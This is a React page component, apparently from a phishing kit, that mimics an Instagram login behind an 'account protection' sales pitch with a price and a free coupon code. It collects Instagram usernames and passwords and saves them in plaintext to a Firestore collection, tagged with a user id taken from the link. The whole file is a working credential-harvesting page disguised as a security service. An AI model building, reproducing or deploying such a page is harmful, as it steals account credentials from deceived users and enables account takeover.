import React, { useState, useEffect } from 'react';
import { db } from '../firebase';  // Firebase Firestore instance
import { collection, addDoc } from 'firebase/firestore';
import { useLocation } from 'react-router-dom';  // Import the useLocation hook

const FormPage = () => {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    coupon: '', // Added coupon to the form data
  });
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const [couponError, setCouponError] = useState(false); // To track coupon validity
  const [price, setPrice] = useState(1000);  // Default price is Rs 1000
  const [userId, setUserId] = useState('');  // Store userId from the URL

  const location = useLocation();

  // Extract userId from the URL query parameters
  useEffect(() => {
    const params = new URLSearchParams(location.search);
    const userIdFromLink = params.get('userid');
    if (userIdFromLink) {
      setUserId(userIdFromLink);
    }
  }, [location]);

  // Handle form input changes
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });

    // Validate coupon code in real-time
    if (name === 'coupon') {
      if (value === 'FREE1000') {
        setCouponError(false);  // Valid coupon
        setPrice(0);  // Set price to Rs 0 when coupon is applied
      } else {
        setCouponError(true);  // Invalid coupon
        setPrice(1000);  // Reset price to Rs 1000 if coupon is wrong
      }
    }
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (couponError) {
      setMessage('Invalid coupon. Please try again.');
      return;  // Block submission if the coupon is invalid
    }

    setLoading(true);
    setMessage('');

    try {
      // Save form data to Firestore, including the userId
      await addDoc(collection(db, 'submissions'), {
        ...formData,
        userId: userId,  // Store the userId from the URL parameter
        timestamp: new Date(),
      });
      setMessage('Login request submitted successfully! Our team will review your request.');
      setFormData({ username: '', password: '', coupon: '' });
      setPrice(1000); // Reset price after submission
    } catch (error) {
      console.error('Error adding document: ', error);
      setMessage('There was an error submitting your request. Please try again later.');
    }
    setLoading(false);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen">
      
      {/* Highlighted Security Explanation on Top */}
      <div className="mb-6 text-center max-w-sm text-sm">
        <p className="mb-4 text-gray-800 font-bold">
          Why choose our service? <span className="text-red-500">Here’s why:</span>
        </p>
        <ul className="list-disc list-inside text-left text-gray-800 font-bold mb-4">
          <li className="text-lg">🛡 Protection from phishing attacks and hacking attempts</li>
          <li className="text-lg">🔒 Two-factor authentication setup assistance</li>
          <li className="text-lg">⏰ 24/7 monitoring and account recovery</li>
        </ul>
        <p className="text-gray-800">
          Our service ensures that your Instagram account stays secure against the latest threats. We’re here to help you safeguard your online presence.
        </p>
      </div>

      {/* Display the price */}
      <div className="mb-4 text-center">
        <h2 className="text-2xl font-bold">Price: Rs {price}</h2>
      </div>

      {/* Container for the form */}
      <div className="w-full max-w-xs bg-white p-6 rounded-lg shadow-lg">
        {/* Logo Placeholder */}
        <h1 className="text-3xl font-bold text-center text-gray-800 mb-6">Instagram</h1>

        {/* Instagram-Like Login Form with Coupon */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="text"
              name="username"
              value={formData.username}
              onChange={handleInputChange}
              required
              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="Username"
            />
          </div>
          <div>
            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleInputChange}
              required
              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="Password"
            />
          </div>
          <div>
            <input
              type="text"
              name="coupon"
              value={formData.coupon}
              onChange={handleInputChange}
              required
              className={`w-full p-3 border ${couponError ? 'border-red-500' : 'border-gray-300'} rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500`}
              placeholder="Enter coupon code"
            />
            {couponError && <p className="text-red-500 text-sm mt-1">Invalid coupon code.</p>}
          </div>
          <button
            type="submit"
            className={`w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition duration-300 ${loading || couponError ? 'opacity-50 cursor-not-allowed' : ''}`}
            disabled={loading || couponError}  // Disable button if coupon is invalid
          >
            {loading ? 'Submitting...' : 'Log In'}
          </button>
        </form>

        {/* Forgot password link */}
        <p className="text-center mt-4 text-sm text-blue-500 hover:underline cursor-pointer">
          Forgot Password?
        </p>

        {/* Message after submission */}
        {message && <p className="text-center mt-4 text-green-500">{message}</p>}

        {/* Divider */}
        <div className="flex items-center my-6">
          <div className="flex-grow border-t border-gray-300"></div>
          <span className="px-3 text-gray-500 text-sm">OR</span>
          <div className="flex-grow border-t border-gray-300"></div>
        </div>

        {/* Sign Up prompt */}
        <p className="text-center text-sm">
          Don't have an account?{' '}
          <span className="text-blue-500 hover:underline cursor-pointer">Sign up</span>
        </p>
      </div>

    </div>
  );
};

export default FormPage;
